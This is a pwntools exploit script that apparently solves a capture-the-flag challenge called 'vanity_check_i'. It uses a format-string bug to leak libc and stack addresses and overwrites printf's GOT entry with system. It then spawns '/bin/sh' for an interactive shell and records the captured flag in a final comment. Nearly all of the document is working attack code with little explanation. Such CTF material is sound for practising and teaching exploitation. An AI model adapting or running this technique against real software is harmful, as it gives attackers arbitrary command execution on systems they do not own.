#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host vanity-check-i.idek.team --port 1337 vanity_check_i
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vanity_check_i')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'vanity-check-i.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+124
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
libc = ELF('./libc-2.31.so')

offset = 6
print("Offset:    ", offset)

#for i in range(60):
#    io.sendline(f"%{i}$p")

io.sendline("%41$p")

io.recvline()
io.recvline()
leak = int(io.recvline().rstrip(), 0)
print('leak: ', hex(leak))

io.clean()
io.sendline("%48$p")
#io.recvline()

stack_leak = int(io.recvline().rstrip(), 0)
print('stack leak:    ', hex(stack_leak))
printf_got = stack_leak + 0x22e0
print('printf GOT:    ', hex(printf_got))
libc_base = leak - 0x0270b3
malloc_hook = libc_base + 0x1ebb70
free_hook = libc_base + 0x1eeb28
print("BASE:    ", hex(libc_base))
print("__malloc_hook:    ", hex(malloc_hook))
print("__free_hook:    ", hex(free_hook))
system = libc_base + 0x55410
one_gad = libc_base + 0xe6c7e
print("onegad:    ", hex(one_gad))

writes = {printf_got : system}
buf = fmtstr_payload(offset, writes, write_size='short')
io.sendline(buf)
io.sendline(b'/bin/sh\x00')

io.interactive()
# idek{ohhhh_s0_th3_c0mp1l3r_w4rn3d_m3_f0r_4_r34s0n...}

